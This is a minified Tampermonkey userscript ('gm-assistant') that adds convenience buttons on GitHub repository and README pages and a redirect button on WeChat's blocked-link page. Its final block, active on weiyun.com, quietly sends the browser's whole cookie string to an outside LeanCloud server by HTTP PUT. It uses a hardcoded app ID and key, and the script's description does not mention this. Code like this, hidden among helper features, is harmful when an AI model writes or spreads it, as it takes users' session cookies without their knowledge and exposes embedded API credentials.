/**
 *  name: @jswork/gm-assistant
 *  description: Tampermonkey assistant.
 *  homepage: https://github.com/afeiship/gm-assistant
 *  version: 1.0.20
 *  date: 2021-07-19T05:52:35.855Z
 *  license: MIT
 */

!function(t){"function"==typeof define&&define.amd?define(t):t()}((function(){$(document).ready(()=>{if(!document.URL.includes("github.com/afeiship?tab=repositories"))return;const t=$("#user-repositories-list");t.find('li a[itemprop="name codeRepository"]').each((t,e)=>{const a=$(e).text().trim(),n=$(e).parent(),i=n.text().includes("Private"),o=`git clone git@github.com:afeiship/${a}.git`,c=$(`<button data-gm-npm="${`npm i -S @${i?"afeiship":"jswork"}/${a}`}" class="mr-1 gm-btn gm-btn-negative">npm</button>`),d=$(`<button data-gm-gclone="${o}" class="gm-btn gm-btn-default">github</button>`);n.append(c),n.append(d)}),t.find("[data-gm-npm]").click(t=>{const e=$(t.target).data("gm-npm");gmsdk.setClipboard(e)}),t.find("[data-gm-gclone]").click(t=>{const e=$(t.target).data("gm-gclone");gmsdk.setClipboard(e)})}),$(document).ready(()=>{if(!$("#readme").length)return;const t=$('#js-repo-pjax-container [data-pjax="#js-repo-pjax-container"]').eq(0).text(),e=t=>`<div class="mb-2 input-group">\n      <input class="form-control input-monospace input-sm bg-gray-light" value="${t}" aria-label="${t}" disabled>\n      <div class="input-group-button">\n        <clipboard-copy value="${t}" aria-label="Copy to clipboard" class="btn btn-sm" tabindex="0" role="button"><svg class="octicon octicon-clippy" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M5.75 1a.75.75 0 00-.75.75v3c0 .414.336.75.75.75h4.5a.75.75 0 00.75-.75v-3a.75.75 0 00-.75-.75h-4.5zm.75 3V2.5h3V4h-3zm-2.874-.467a.75.75 0 00-.752-1.298A1.75 1.75 0 002 3.75v9.5c0 .966.784 1.75 1.75 1.75h8.5A1.75 1.75 0 0014 13.25v-9.5a1.75 1.75 0 00-.874-1.515.75.75 0 10-.752 1.298.25.25 0 01.126.217v9.5a.25.25 0 01-.25.25h-8.5a.25.25 0 01-.25-.25v-9.5a.25.25 0 01.126-.217z"></path></svg></clipboard-copy>\n      </div>\n    </div>`,a=e($('tab-container [role="tabpanel"] .input-group .form-control').eq(1).val()),n=e(t);$("#readme .Box-body .markdown-body h1").after(`<div class="d-flex">\n      <div class="pr-1 flex-1">${a}</div>\n      <div class="flex-1">${n}</div>\n    </div>`)}),$(document).ready(()=>{var t=$(".weui-msg"),e=t.find(".weui-msg__desc").text().trim(),a=t.find(".weui-msg__title").text().includes("已停止访问该网页")?"disabled":"primary";t.after(`<button id="goto" ${a} class="weui-btn weui-btn_${a}" style="cursor: pointer;">一键前往</button>`),$("#goto").click(()=>{location.href=e})}),$(document).ready(()=>{if(!location.host.includes("weiyun.com"))return;const t={"X-LC-Id":"8alQIE7rUNqk6Y7DqxPgrJvK-gzGzoHsz","X-LC-Key":"s6OpPBU2VdcU0o8F2GifMgVT"};nx.waitToDisplay(".mod-act-group .act-item-txt",1e3,e=>{gmsdk.http.put({url:"https://8alqie7r.lc-cn-n1-shared.com/1.1/classes/token/60f4d3a42c88c922c2e16a39",data:{weiyun_token:document.cookie},headers:t}).then(t=>{console.log("WEIYUN TOKEN has update.")})})})}));
